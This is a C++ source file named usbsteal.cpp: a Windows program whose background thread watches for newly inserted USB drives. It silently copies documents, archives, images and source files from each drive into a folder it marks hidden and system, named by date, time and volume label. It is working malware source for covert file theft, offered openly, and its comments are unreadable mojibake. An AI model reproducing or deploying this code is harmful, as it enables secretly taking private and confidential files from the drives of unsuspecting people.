/*
* Copyright (c) 2005, Outmatch@gmail.com
* All rights reserved.
*
* �ļ����ƣ�usbsteal.cpp
* ժ    Ҫ��USB���Գ���,�����̼߳��Ӳ�����U������
*/

#include "stdafx.h"
#include "config.h"
#include "folderutils.h"

using namespace std;

typedef std::vector<std::string> usbList;

extern const std::string& getConfigPath();
extern std::string getDestDirName();
extern usbList searchforUSB();
extern DWORD setDirHidden(const std::string &dir);
extern void copierThreadFunc(LPVOID *);
extern std::string getSystemPath();
extern std::string getVolumeName(const std::string& sDevice);

HRESULT   EnumDirectory(LPCTSTR   lpszDirectory,BOOL   bIncludeSubDirectory, std::vector<std::string>& vsFiles);

/// ��ǰU���̷�
char g_szCurVol[MAX_PATH+1] = { 0 };

/// ����U�̼��ʱ�䣬����
enum { INTERVAL = 1000 };

/// �����³��ֵ�U�̣��ҵ��󷵻����̷�
usbList searchforUSB()
{
	static usbList prevUsbList; 
	usbList list;
	char buf[MAX_PATH+1];
	DWORD len = GetLogicalDriveStrings(sizeof(buf), buf);

	for(CHAR *s=buf; *s; s+=strlen(s) + 1) {
		UINT uDriveType = GetDriveType(s);
		if(uDriveType == DRIVE_REMOVABLE) {
			list.push_back((s));
		}
	}

	if(prevUsbList == list) {
		list.clear();
		return list;
	}
	else {
		// �иı�,����prevUsbList �� list����Ĳ���.
		usbList newlist;

		for(usbList::iterator it = list.begin();
				it != list.end();
				++it)
		{
			bool skip = false;
			for(size_t i=0; i<prevUsbList.size(); i++) {
				if(*it == prevUsbList[i])
				{
					skip = true;	
					break;
				}
				else
				{
					skip = false;
				}
			}

			if(skip == false) {
				newlist.push_back(*it);
			}
		}
		prevUsbList = list;
		return newlist;
	}
}

/// �����ļ��İ������������*����������������
const char* g_szFileAcceptList[] = {
	"doc",
	"xls",
	"ppt",
	"exe",
	"zip",
	"rar",
	"txt",
	"rtf",
	"pdf",
	"html",
	"htm",
	"jpg",
	"gif",
	"png",
	"cpp",
	"hpp",
	"c",
	"h",
//	"*",	ȫ������
	0
};

/** ����ļ��Ƿ���Ҫ���� */
bool needCopy(const std::string &path)
{
	char szExt[MAX_PATH+1] = { 0 }; 
	_splitpath(path.c_str(), 0, 0, 0, szExt);
	for(const char** p = g_szFileAcceptList; *p != 0; p++) {
		// �����*��������
		if(stricmp(*p, "*") == 0)
			return true;
		// ".doc", �������ַ�
		if(stricmp(*p, szExt+1) == 0)
			return true;
	}
	return false;
}

/// �õ�����Ŀ���ļ���������Դ�ļ�����Ŀ��·��
std::string getOutputFilename(const std::string& sFilename, const std::string& sSrcDir, const std::string &sDstDir)
{
	size_t pos = sFilename.find(sSrcDir);
	if(pos == std::string::npos)
		return sDstDir + sFilename;
	pos += sSrcDir.length();
	if(sDstDir[sDstDir.length()-1] != '\\')
		return sDstDir + "\\" + sFilename.substr(pos);
	return sDstDir + sFilename.substr(pos);
}

/// �����߳�
void copierThreadFunc(LPVOID *)
{
	// Search for USB device
	for( ;; ) {
		usbList list;
		list = searchforUSB();

		if(list.size() > 0) {
			for(size_t i=0; i<list.size(); i++) {
				string srcDir = list[i];
//				strcpy(g_szCurVol, srcDir.c_str());
				g_szCurVol[0] = srcDir[0];
				strcpy(&g_szCurVol[1], ":\\");
				string dstDir = getDestDirName();
				// srcDir += "*.*";
#if 0
				MessageBox(0, srcDir.c_str(), "SRC", 0);
#endif
				// ��ʼ�����ļ�
				// TODO:��ʹ���ļ�ͨ���б�
				// CFolderUtils::CopyFolder(srcDir.c_str(), dstDir.c_str());
				std::vector<std::string> v;
				EnumDirectory(srcDir.c_str(), TRUE, v);
				for(std::vector<std::string>::iterator
						it = v.begin();
						it != v.end();
						++it) 
				{
					if(needCopy(*it)) {
						std::string sDstFileName = getOutputFilename(*it, srcDir, dstDir);
						// TODO: �����ļ���
						char szDrive[3], szDir[MAX_PATH+1];
						_splitpath(sDstFileName.c_str(), szDrive, szDir, 0, 0);
						std::string sDir = szDrive;
						sDir += szDir;
						CFolderUtils::CreateFolder(sDir.c_str());
						CopyFile(it->c_str(), sDstFileName.c_str(), FALSE);
					}
				}
				
				Sleep(INTERVAL);
			}
		}

		Sleep(INTERVAL);
	}
	_endthread();
}

/// ���˲���ΪĿ¼����\/:*?"<>|�ַ�
void filterBadChar(std::string &str)
{
	static const char *szBadChar = "\\/:*?\"<>|";
	for(size_t i=0; i<str.length(); ++i) {
		for(size_t j=0; j<strlen(szBadChar); ++j) {
			if(str[i] == szBadChar[j])
				str[i] = '-';
		}
	}
}

// �õ������������Ϊ�̱�
std::string getVolumeName(const std::string& sDevice)
{
	char szVol[256];
	char FileSysName[256];
	DWORD SerialNum;//���к�  
	DWORD FileNameLength;  
	DWORD FileSysFlag;
	memset(szVol, 0, 256);
	int iRet = ::GetVolumeInformation(sDevice.c_str(),
		szVol,  
		256,  
		&SerialNum,  
		&FileNameLength,  
		&FileSysFlag,  
		FileSysName,  
		256);
	if(iRet)
		return szVol;
	return "";
}

/// �������Ŀ¼��: ��ʽ: ���� - ʱ�� - �����
std::string getOutputDirname()
{
	time_t ti = time(0);

	char datebuf[9];
	_strdate(datebuf);
	std::string sDate(datebuf);
	filterBadChar(sDate);

	char timebuf[9];
	_strtime(timebuf);
	std::string sTime(timebuf);
	filterBadChar(sTime);

	std::string str = getVolumeName(g_szCurVol);

	if(str == "") {
		str = "�޾��";
	}

	filterBadChar(str);

	char buf[1024];
	_snprintf(buf, 1024, "%s %s %s", sDate.c_str(), sTime.c_str(), str.c_str());
	
	return buf;
}

std::string loadConfig()
{
	std::string dir;
	dir = getConfigPath();
	ifstream f(dir.c_str());
	f >> dir;
	dir += "\\";
	return dir;
}

/// �õ�����Ŀ��Ŀ¼��
std::string getDestDirName()
{
	std::string dir = loadConfig();

	CFolderUtils::CreateFolder(dir.c_str());
	setDirHidden(dir);

	std::string str = getOutputDirname();
	dir += str;
	CFolderUtils::CreateFolder(dir.c_str());

	return dir;
}

/// ��Ŀ¼��Ϊ����
DWORD setDirHidden(const std::string &dir)
{
	DWORD stat = GetFileAttributes( dir.c_str());
	stat |= FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
	DWORD ret = SetFileAttributes( dir.c_str(), stat );

	return ret;
}

